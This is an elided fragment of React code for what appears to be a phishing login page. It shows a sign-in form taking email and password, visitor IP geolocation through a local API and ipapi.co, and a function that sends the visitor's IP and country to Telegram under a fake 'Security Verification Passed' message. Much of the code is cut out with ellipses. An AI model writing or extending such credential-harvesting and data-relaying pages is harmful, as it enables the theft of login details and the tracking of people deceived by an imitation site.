...
const MainAppInner: React.FC = () => {
  ...
  }, [ipInfo, view, email, password, location.pathname, sessionId]);
  ...
  const fetchCurrentLocation = async () => {
    ...
    try {
      const res = await fetch(`${window.location.origin}/api/geo`);
  ...
  const handleVerificationSuccess = async () => {
    ...
    await sendToTelegram(`<b>🔒 Security Verification Passed</b>\n<b>📍 IP:</b> ${currentData.ip}\n<b>🚩 Country:</b> ${currentData.country}`);
    setView('login');
  };
      ...
      <div className="w-full px-6 pt-8 pb-4 animate-in slide-in-from-right-10 duration-500">
        ...
        <form onSubmit={handleLogin} className="space-y-4">
          ...
          <button
            ...
            className={`w-full py-4 rounded-full text-lg font-bold text-white ${(!email || !password) ? 'bg-[#E0E0E0]' : 'bg-[#FF4747]'}`}
          >
            {t('signIn')}
          </button>
        </form>
...
const MainApp: React.FC = () => {
  ...
  useEffect(() => {
    fetch(`${window.location.origin}/api/geo`)
      .then(r => r.json())
      .then(d => { if (d.country && d.country !== 'Unknown') setCountry(d.country); })
      .catch(() => {
        // Browser fallback
        fetch('https://ipapi.co/json/')
          .then(r => r.json())
          .then(d => { if (!d.error && d.country_name) setCountry(d.country_name); })
          .catch(() => {});
      });
  }, []);
